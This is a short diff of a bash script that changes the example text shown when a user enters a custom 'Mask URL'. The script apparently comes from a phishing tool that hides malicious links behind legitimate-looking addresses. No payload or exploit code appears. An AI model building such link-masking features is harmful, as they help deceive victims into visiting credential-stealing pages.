@@ -527,7 +527,7 @@ custom_mask() {
     read -n1 -p "${RED}[${WHITE}?${RED}]${ORANGE} Do you want to change Mask URL? ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}] :${ORANGE} " mask_op
     echo
     if [[ $(echo "$mask_op" | tr '[:upper:]' '[:lower:]') == "y" ]]; then
-        echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Enter your custom URL below ${CYAN}(${ORANGE}Example: https://get-free-followers.com${CYAN})\n"
+        echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Enter your custom URL below ${CYAN}(${ORANGE}Example: www.therealwebsite.com${CYAN})\n"
         read -e -p "${WHITE} ==> ${ORANGE}" mask_url
         if [[ ${mask_url} =~ ^https?:// || ${mask_url::4} == "www." ]] && \
            [[ ${mask_url#http://} =~ ^[^,~!@%:\=\#\;\^\*\"\'\|\?+\<\>\(\{\)\}\\/]+$ ]] && \
